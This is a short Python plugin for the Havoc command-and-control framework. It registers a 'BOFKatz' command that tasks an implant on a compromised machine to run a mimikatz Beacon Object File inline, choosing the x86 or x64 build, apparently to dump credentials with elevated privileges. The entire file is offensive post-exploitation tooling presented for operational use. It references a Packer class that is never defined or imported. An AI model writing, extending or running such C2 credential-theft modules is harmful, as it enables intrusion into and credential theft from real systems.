from havoc import Demon, RegisterCommand
from struct import pack, calcsize
import shutil
import os
import threading
import time
import subprocess


def BofKatz(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    if demon.ProcessArch == "x86":
        BOF_FILE = "BOFKatz.x86.o"
    else:
        BOF_FILE = "BOFKatz.x64.o"

    # needs to run in high integrity mode :)
    if len(param) > 0:
        for arg in param:
            packer.addstr(str(arg))
    else:
        packer.addstr("")

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run BOFKatz" )

    
    demon.InlineExecute( TaskID, "go", f"{BOF_FILE}", packer.getbuffer(), False )

    return TaskID

RegisterCommand( BofKatz, "", "BOFKatz", "mimikatz Beacon Object File implementation", 0, "", "BOFKatz coffee" )